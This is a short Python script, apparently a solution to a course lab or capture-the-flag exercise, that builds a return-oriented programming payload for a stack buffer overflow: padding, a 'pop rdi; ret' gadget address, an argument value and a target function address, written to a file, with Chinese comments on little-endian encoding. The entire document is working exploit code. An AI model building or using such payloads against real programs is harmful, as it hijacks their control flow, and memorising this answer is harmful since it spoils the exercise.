padding = b"A" * 16                  
pop_rdi_addr = b"\xc7\x12\x40\x00\x00\x00\x00\x00"  # 0x4012c7 小端 (pop rdi; ret)
x_value = b"\xf8\x03\x00\x00\x00\x00\x00\x00"       # 1016 (0x3f8) 小端，8 字节
func2_address = b"\x16\x12\x40\x00\x00\x00\x00\x00"  # 0x401216 小端 (目标函数)


payload = padding + pop_rdi_addr + x_value + func2_address
with open("ans2.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans2.txt")